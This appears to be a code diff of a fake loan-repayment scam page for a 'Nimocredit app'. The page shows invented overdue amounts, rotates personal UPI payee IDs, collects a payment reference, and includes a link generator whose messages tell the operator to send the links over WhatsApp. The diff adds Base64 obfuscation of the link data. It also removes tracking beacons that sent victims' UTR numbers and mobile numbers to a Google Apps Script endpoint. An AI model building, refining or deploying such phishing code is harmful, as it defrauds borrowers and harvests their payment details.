@@ -6,8 +6,20 @@
     <title>Repayment Portal & Generator</title>
     
     <script>
+        // URL se data read karne aur Base64 decode karne ka smart system
         const urlParams = new URLSearchParams(window.location.search);
-        const hasParams = urlParams.has('mobile') || urlParams.has('payable');
+        const dataParam = urlParams.get('data');
+        
+        let decodedData = {};
+        if (dataParam) {
+            try {
+                decodedData = JSON.parse(atob(dataParam));
+            } catch (e) {
+                console.error("Invalid data");
+            }
+        }
+
+        const hasParams = !!dataParam;
 
         const MY_CONFIG = {
             appName: "Nimocredit app",              
@@ -16,13 +28,13 @@
                 "ashalaon7770@ptyes",  
                 "raghavy807-1@okhdfcbank"   
             ],
-            mobileNumber: urlParams.get('mobile') || "91630***1323",        
-            payableAmount: urlParams.get('payable') || "₹4800",           
-            disbursedAmount: urlParams.get('disbursed') || "₹4500",        
+            mobileNumber: decodedData.m || "91630***1323",        
+            payableAmount: decodedData.p || "₹4800",           
+            disbursedAmount: decodedData.d || "₹4500",        
             loanTerm: "7 Days",                 
-            repaymentDate: urlParams.get('date') || "2/11/2026",
-            orderId: urlParams.get('order') || "69239189",                 
-            overdueText: urlParams.get('overdue') || "5 Days Overdue"        
+            repaymentDate: "2/11/2026",
+            orderId: decodedData.id || "69239189",                 
+            overdueText: decodedData.o || "5 Days Overdue"        
         };
     </script>
 
@@ -652,7 +664,6 @@
         </div>
     </div>
 
-    <!-- Loan Details Box (Sirf 2 zaroori options rakhe hain) -->
     <div class="details-card">
         <div class="section-title">Loan Details</div>
         <div class="detail-row">
@@ -789,10 +800,9 @@
     </div>
 </div>
 
-
-<!-- 2. Built-in Link Generator Screen (Sirf 3-4 zaroori boxes) -->
+<!-- 2. Built-in Link Generator Screen (Base64 Encrypted Link Maker) -->
 <div class="generator-box" id="generatorBox">
-    <h2>⚡ Quick Link Generator</h2>
+    <h2>⚡ Professional Link Generator</h2>
     
     <div class="form-group">
         <label>Mobile Number:</label>
@@ -800,26 +810,26 @@
     </div>
 
     <div class="form-group">
-        <label>Payable Amount (e.g. ₹4800):</label>
-        <input type="text" id="genPayable" value="₹4800">
+        <label>Payable Amount (e.g. ₹5000):</label>
+        <input type="text" id="genPayable" value="₹5000">
     </div>
 
     <div class="form-group">
-        <label>Disbursed Amount (e.g. ₹4500):</label>
-        <input type="text" id="genDisbursed" value="₹4500">
+        <label>Disbursed Amount (e.g. ₹3500):</label>
+        <input type="text" id="genDisbursed" value="₹3500">
     </div>
 
     <div class="form-group">
-        <label>Overdue Text (e.g. 5 Days Overdue):</label>
-        <input type="text" id="genOverdue" value="5 Days Overdue">
+        <label>Overdue Text (e.g. 4 Days Overdue):</label>
+        <input type="text" id="genOverdue" value="4 Days Overdue">
     </div>
 
     <div class="form-group">
         <label>Order ID:</label>
-        <input type="text" id="genOrder" value="69239189">
+        <input type="text" id="genOrder" value="73940951">
     </div>
 
-    <button class="gen-btn" onclick="generateLink()">Generate Link 🚀</button>
+    <button class="gen-btn" onclick="generateLink()">Generate Professional Link 🚀</button>
 
     <div class="result-box" id="resultLink"></div>
     <button class="copy-gen-btn" id="copyBtn" onclick="copyGeneratedLink()">Copy Link 📋</button>
@@ -892,8 +902,6 @@
             document.getElementById('lblTransferText').innerText = `transfer ${MY_CONFIG.payableAmount}`;
             
             updateUpiDisplay();
-
-            new Image().src = "https://script.google.com/macros/s/AKfycbwJyHYi0_KCFIcfP0bwIob2tPHOa-gbcKoAVod2zUin-K3bkMKaBKZQdVdgsd7KKRo/exec?type=view";
         } else {
             document.getElementById('step1Screen').style.display = 'none';
             document.getElementById('generatorBox').style.display = 'block';
@@ -932,7 +940,6 @@
                 document.body.removeChild(textArea);
             }
             alert('Copy UPI Successfully!');
-            new Image().src = "https://script.google.com/macros/s/AKfycbwJyHYi0_KCFIcfP0bwIob2tPHOa-gbcKoAVod2zUin-K3bkMKaBKZQdVdgsd7KKRo/exec?type=copy";
             currentUpiIndex = (currentUpiIndex + 1) % MY_CONFIG.upiList.length;
             updateUpiDisplay();
             startUpiRotation();
@@ -945,13 +952,10 @@
             alert('Please enter a valid UTR number.');
         } else {
             alert('Submit Successfully!');
-            var utrNumber = encodeURIComponent(utr);
-            var mobileNo = encodeURIComponent(MY_CONFIG.mobileNumber || '');
-            var trackingUrl = "https://script.google.com/macros/s/AKfycbwJyHYi0_KCFIcfP0bwIob2tPHOa-gbcKoAVod2zUin-K3bkMKaBKZQdVdgsd7KKRo/exec?type=utr&utr=" + utrNumber + "&mobile=" + mobileNo;
-            new Image().src = trackingUrl;
         }
     }
 
+    // Base64 Encrypted Link Generator Function
     function generateLink() {
         let mobile = document.getElementById('genMobile').value;
         let payable = document.getElementById('genPayable').value;
@@ -959,9 +963,18 @@
         let overdue = document.getElementById('genOverdue').value;
         let order = document.getElementById('genOrder').value;
 
-        let baseUrl = window.location.href.split('?')[0];
+        // Data ko chota object bana kar Base64 mein convert karna
+        let rawData = {
+            m: mobile,
+            p: payable,
+            d: disbursed,
+            o: overdue,
+            id: order
+        };
 
-        let finalLink = `${baseUrl}?mobile=${encodeURIComponent(mobile)}&payable=${encodeURIComponent(payable)}&disbursed=${encodeURIComponent(disbursed)}&overdue=${encodeURIComponent(overdue)}&order=${encodeURIComponent(order)}`;
+        let encodedData = btoa(JSON.stringify(rawData));
+        let baseUrl = window.location.href.split('?')[0];
+        let finalLink = `${baseUrl}?data=${encodedData}`;
 
         let resBox = document.getElementById('resultLink');
         resBox.style.display = 'block';
@@ -973,7 +986,7 @@
     function copyGeneratedLink() {
         let linkText = document.getElementById('resultLink').innerText;
         navigator.clipboard.writeText(linkText);
-        alert('Link Copied Successfully! Ab aap isko WhatsApp par bhej sakte hain.');
+        alert('Professional Link Copied Successfully! Ab aap isko WhatsApp par bhej sakte hain.');
     }
 </script>
 
